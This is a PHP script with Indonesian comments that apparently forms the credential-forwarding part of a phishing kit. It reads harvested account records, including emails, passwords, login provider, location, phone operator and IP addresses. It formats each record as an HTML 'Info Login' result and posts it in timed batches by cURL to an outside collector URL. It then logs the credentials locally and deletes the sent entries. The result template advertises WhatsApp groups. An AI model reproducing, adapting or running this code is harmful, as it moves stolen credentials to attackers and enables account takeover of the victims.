<?php
// =============================
// KONFIGURASI
// =============================
$batchSize = 4;          
$intervalMinutes = 1;  
$useResume = true;       
$curlUrl = "https://pusatbnhg.luky-nesia.my.id/memekbau.php";

// =============================
// INCLUDE DATA
// =============================
include __DIR__ . '/generated_accounts.php';
if (!isset($data) || !is_array($data) || empty($data)) {
    die("Data belum terdefinisi di generated_accounts.php");
}

// =============================
// FILE PENYIMPANAN
// =============================
$dir = __DIR__ . '/system';
$logFile = $dir . '/pusat.txt';
$idxFile = $dir . '/pusat.idx';
if (!is_dir($dir)) mkdir($dir, 0755, true);

// =============================
// UTILITAS
// =============================
function esc($s) { return htmlspecialchars((string)$s, ENT_QUOTES, 'UTF-8'); }
function read_index($file) { return file_exists($file) ? max(0, intval(@file_get_contents($file))) : 0; }
function write_index($file, $val) { file_put_contents($file, intval($val), LOCK_EX); }

@set_time_limit(0);

// =============================
// PROSES
// =============================
$total = count($data);
$startIndex = $useResume ? read_index($idxFile) : 0;
if ($startIndex >= $total) { echo "Semua data telah diproses.<br>"; exit; }

$chunks = array_chunk($data, $batchSize);
$startChunk = intdiv($startIndex, $batchSize);
$intervalSeconds = $intervalMinutes * 60;

echo "<pre>";
for ($ci = $startChunk; $ci < count($chunks); $ci++) {
    $chunk = $chunks[$ci];
    $offset = ($useResume && $ci == $startChunk) ? $startIndex % $batchSize : 0;

    foreach (array_slice($chunk, $offset) as $rowIndex => $row) {
        $gmail    = $row['gmail'] ?? '';
        $password = $row['password'] ?? '';
        $login    = $row['login'] ?? '';
        $kota     = $row['kota'] ?? '';
        $daerah   = $row['daerah'] ?? '';
        $operator = $row['operator'] ?? '';
        $ipp      = $row['ipp'] ?? '';
        $bendera  = $row['bendera'] ?? '';
        $nomer    = $row['nomer'] ?? '';

        $subjek = esc($bendera) . " " . esc($nomer) . " | Result | Punya Si " . esc($gmail) . " | Login " . esc($login);
        $pesan = <<<EOD
<!DOCTYPE html>
	<html>
	<head>
		<title></title>
		<meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no"/>
		<style type="text/css">
			body {
				font-family: "Helvetica";
				width: 90%;
				display: block;
				margin: auto;
				border: 1px solid #fff;
				background: #fff;
			}
			.result {
				width: 100%;
				height: 100%;
				display: block;
				margin: auto;
				position: fixed;
				top: 0;
				right: 0;
				left: 0;
				bottom: 0;
				z-index: 999;
				overflow-y: scroll;
				border-radius: 10px;
			}
			.tblResult {
				width: 100%;
				display: table;
				margin: 0px auto;
				border-collapse: collapse;
				text-align: center;
				background: #fcfcfc;
			}
			.tblResult th {
				text-align: left;
				font-size: 1em;
				margin: auto;
				padding: 15px 10px;
				background: #001240;
				border: 2px solid #001240;
				color: #fff;
			}
			.tblResult td {
				font-size: 1em;
				margin: auto;
				padding: 10px;
				border: 2px solid #001240;
				text-align: left;
				font-weight: bold;
				color: #000;
				text-shadow: 0px 0px 10px #fcfcfc;
			}
			.tblResult th img {
				width: 100%;
				display: block;
				margin: auto;
				box-shadow: 0px 0px 10px rgba(0,0,0, 0.5);
				border-radius: 10px;
			}
		</style>
	</head>
	<body>
		<div class="result">
			<table class="tblResult">
				<tr>
					<th style="text-align: center;" colspan="3">Info Login $login</th>
				</tr>
				<tr>
					<td style="border-right: none;">Email $login</td>
					<td style="text-align: center;">$gmail</td>
				</tr>
				<tr>
					<td style="border-right: none;">Kata Sandi</td>
					<td style="text-align: center;">$password</td>
				</tr>	
				<tr>
					<td style="border-right: none;">Login</td>
					<td style="text-align: center;">$login</td>
				</tr>
				<tr>
				<td style="border-right: none;">Kota</td>
					<td style="text-align: center;">$kota</td>
				</tr>
			    <tr>
			    <td style="border-right: none;">Daerah</td>
					<td style="text-align: center;">$daerah</td>
				</tr>
			    <tr>
			    <td style="border-right: none;">Operator</td>
					<td style="text-align: center;">$operator</td>
				</tr>
			    <tr>
					<td style="border-right: none;">IP Address</td>
					<td style="text-align: center;">$ipp</td>
				</tr>			
				<tr>
							<th style="text-align: center;" colspan="3"><a style="border:2px solid #fff;text-decoration:none;color:#fff;border-radius:3px;padding:3px;background:#000000;" href="https://chat.whatsapp.com/KFZHkfIjSXf52piRWOWXlD">GRUB JASTEB GACOR</a>
<a style="border:2px solid #fff;text-decoration:none;color:#fff;border-radius:3px;padding:3px;background:#000000;" href="https://chat.whatsapp.com/Evv0s273GXt7CHwty5QPO7">GB WEB VIP</a>
</div>
            </th>
				</tr>
			</table>
		</div>
	</body>
	</html>
EOD;

        // === Kirim cURL ===
        $ch = curl_init();
        curl_setopt_array($ch, [
            CURLOPT_URL => $curlUrl,
            CURLOPT_POST => true,
            CURLOPT_POSTFIELDS => http_build_query(['subjek' => $subjek, 'pesan' => $pesan]),
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_TIMEOUT => 10,
        ]);
        @curl_exec($ch);
        curl_close($ch);

        // === Simpan ke Log ===
        file_put_contents($logFile, "$gmail|$password|$ipp|$login\n", FILE_APPEND);

        // === Hapus data setelah terkirim ===
        unset($data[array_search($row, $data)]);
        file_put_contents(__DIR__ . '/generated_accounts.php', "<?php\n\$data = " . var_export(array_values($data), true) . ";\n?>");

        // Update index posisi terakhir
        if ($useResume) write_index($idxFile, ($ci * $batchSize) + $offset + $rowIndex + 1);

        echo "Terkirim & dihapus: $gmail ($login)\n";
    }

    if ($ci < count($chunks) - 1 && $intervalSeconds > 0) {
        echo "Menunggu {$intervalSeconds} detik sebelum batch berikutnya...\n";
        sleep($intervalSeconds);
    }
}

echo "\nSemua data selesai diproses.\n</pre>";
?>
